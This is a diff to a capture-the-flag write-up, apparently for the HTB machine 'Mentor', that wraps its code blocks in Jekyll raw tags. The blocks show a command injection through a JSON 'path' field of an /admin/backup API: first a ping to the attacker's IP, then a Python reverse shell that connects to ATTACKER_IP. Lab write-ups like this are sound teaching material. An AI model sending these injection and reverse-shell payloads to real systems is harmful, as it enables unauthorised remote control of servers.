@@ -231,10 +231,12 @@ users                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 56m
 ### Exploiting Vulnerable APIs
 Hitting a few of these endpoints shows that we need a basic Authorization header, presumably a JWT, in order to use the APIs listed.
 
+{% raw %}
 ```
 $ curl -s http://api.mentorquotes.htb/users/                   
 {"detail":[{"loc":["header","Authorization"],"msg":"field required","type":"value_error.missing"},{"loc":["header","Authorization"],"msg":"field required","type":"value_error.missing"}]}
 ```
+{% endraw %}
 
 The most interesting one was for documentation, disclosing a list of APIs on the site as well as the schema used to authenticate to each. Towards the top of the page is an email address for a user named James as well.
 
@@ -285,11 +287,13 @@ Doing so, I discover an `/admin/backup` API that allows POST requests. After tro
 
 This API is most likely meant to make a backup of the site and place it in a user-supplied path, ultimately responding with a **"Done!"** message to confirm it took place. If improperly designed, we may be able to inject arbitrary commands into the code. I start out by testing to see if the server would ping my attacking machine.
 
+{% raw %}
 ```
 {
   "path":  "test; ping -c4 10.10.14.243;"
 }
 ```
+{% endraw %}
 
 ![](../assets/img/2026-04-14-Mentor/8.png)
 
@@ -297,11 +301,13 @@ The trailing semicolon seemed to be the magic trick to getting this to function 
 
 Now that we have confirmed RCE via this endpoint, I standup a Netcat listener and start testing reverse shell payloads. Going down the list on [revshells.com](https://www.revshells.com/), the only one I got to work used Python to carry it out. It's also important to escape the double quotes in the payload as we are sending it in JSON data.
 
+{% raw %}
 ```
 {
 "path": "test; python -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';"
 }
 ```
+{% endraw %}
 
 ![](../assets/img/2026-04-14-Mentor/9.png)
 
